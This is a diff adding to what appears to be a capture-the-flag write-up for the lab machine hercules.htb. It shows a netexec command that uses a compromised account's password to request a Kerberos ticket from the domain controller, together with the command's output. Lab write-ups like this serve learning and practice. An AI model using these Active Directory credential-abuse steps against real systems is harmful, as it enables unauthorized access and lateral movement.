@@ -1525,9 +1525,17 @@ This user is now compromised!
 
 # Compromising `iis_webserver$`
 
+![](Pasted%20image%2020260916214039.png)
 
+I can change the password of this user too
 
 ```python
+nxc smb dc.hercules.htb -u iis_administrator -p 'Password123!' -k --generate-tgt iisadmin
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hercules.htb 445    dc               [+] hercules.htb\iis_administrator:Password123! 
+SMB         dc.hercules.htb 445    dc               [+] TGT saved to: iisadmin.ccache
+SMB         dc.hercules.htb 445    dc               [+] Run the following command to use the TGT: export KRB5CCNAME=iisadmin.ccache
+
 
 ```
 
